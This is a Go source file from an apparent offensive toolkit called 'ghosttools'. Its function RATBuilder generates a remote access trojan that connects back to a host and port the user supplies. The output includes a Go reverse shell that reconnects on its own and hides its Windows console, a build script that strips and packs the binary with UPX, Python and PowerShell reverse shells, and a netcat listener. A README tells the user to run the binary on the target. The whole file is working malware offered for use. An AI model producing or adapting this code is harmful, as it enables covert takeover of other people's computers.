package malicious

import (
	"fmt"
	"os"
	"path/filepath"

	"ghosttools/internal/ui"
)

// RATBuilder builds a multi-format remote access tool.
// Supports: go (auto-reconnect), python, powershell, batch.
func RATBuilder() {
	ui.Cyan("enter LHOST:")
	var lhost string
	fmt.Scanln(&lhost)
	ui.Cyan("enter LPORT:")
	var lport string
	fmt.Scanln(&lport)

	out := "ghosttools_rat"
	os.MkdirAll(out, 0755)

	// ── go reverse shell (auto-reconnect) ──
	goSrc := `package main

import (
	"bufio"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"
)

const (
	C2          = "` + lhost + `:` + lport + `"
	RETRY_SECS  = 15
	SHELL_WIN   = "cmd"
	SHELL_UNIX  = "/bin/sh"
)

func main() {
	hide()
	for {
		if err := connect(); err != nil {
			time.Sleep(RETRY_SECS * time.Second)
			continue
		}
	}
}

func connect() error {
	c, err := net.Dial("tcp", C2)
	if err != nil {
		return err
	}
	defer c.Close()
	r := bufio.NewReader(c)
	for {
		cmd, err := r.ReadString('\n')
		if err != nil {
			return err
		}
		cmd = trim(cmd)
		if cmd == "" { continue }
		if cmd == "exit" { os.Exit(0) }
		out := run(cmd)
		c.Write([]byte(out + "\n$ "))
	}
}

func run(cmd string) string {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command(SHELL_WIN, "/c", cmd)
	} else {
		c = exec.Command(SHELL_UNIX, "-c", cmd)
	}
	out, _ := c.CombinedOutput()
	return string(out)
}

func trim(s string) string {
	for len(s) > 0 && (s[len(s)-1] == '\n' || s[len(s)-1] == '\r' || s[len(s)-1] == ' ') {
		s = s[:len(s)-1]
	}
	return s
}

func hide() {
	if runtime.GOOS != "windows" { return }
	k, _ := syscall.LoadDLL("kernel32.dll")
	p, _ := k.FindProc("GetConsoleWindow")
	hwnd, _, _ := p.Call()
	u, _ := syscall.LoadDLL("user32.dll")
	sp, _ := u.FindProc("ShowWindow")
	sp.Call(hwnd, 0)
}

var _ = io.Discard
`
	os.WriteFile(filepath.Join(out, "main.go"), []byte(goSrc), 0644)

	// go.mod
	os.WriteFile(filepath.Join(out, "go.mod"), []byte("module ghosttools_rat\n\ngo 1.22\n"), 0644)

	// build.bat
	bat := "@echo off\r\ncd /d %~dp0\r\ngo mod tidy\r\ngo build -ldflags \"-s -w -H=windowsgui\" -o rat.exe main.go\r\nupx --best rat.exe 2>nul\r\necho built.\r\n"
	os.WriteFile(filepath.Join(out, "build.bat"), []byte(bat), 0644)

	// ── python one-liner (for testing) ──
	py := fmt.Sprintf(`import socket,subprocess,os
while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("%s",%s))
        os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
        subprocess.call(["/bin/sh","-i"])
    except Exception:
        import time; time.sleep(15)`, lhost, lport)
	os.WriteFile(filepath.Join(out, "shell.py"), []byte(py), 0644)

	// ── powershell reverse shell ──
	ps := fmt.Sprintf(`$c=New-Object Net.Sockets.TCPClient('%s',%s);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`, lhost, lport)
	os.WriteFile(filepath.Join(out, "shell.ps1"), []byte(ps), 0644)

	// ── listener script ──
	listen := "@echo off\r\necho listening on port " + lport + "...\r\nnc -lvnp " + lport + "\r\n"
	os.WriteFile(filepath.Join(out, "listen.bat"), []byte(listen), 0644)

	// ── README ──
	readme := "ghosttools rat builder\n\nLHOST: " + lhost + "\nLPORT: " + lport + "\n\nfiles:\n  main.go      → go reverse shell (auto-reconnect, hidden console)\n  build.bat    → builds rat.exe\n  shell.py     → python reverse shell\n  shell.ps1    → powershell reverse shell\n  listen.bat   → listener launcher\n\nusage:\n  1. run listen.bat on your box (or: nc -lvnp " + lport + ")\n  2. run build.bat to make rat.exe\n  3. run rat.exe on the target\n  4. you get a shell\n"
	os.WriteFile(filepath.Join(out, "README.txt"), []byte(readme), 0644)

	ui.Green("RAT built in ./" + out + "/")
	ui.Cyan("  main.go     → auto-reconnecting go shell")
	ui.Cyan("  build.bat   → build rat.exe")
	ui.Cyan("  shell.py    → python fallback")
	ui.Cyan("  shell.ps1   → powershell fallback")
	ui.Cyan("  listen.bat  → start listener")
}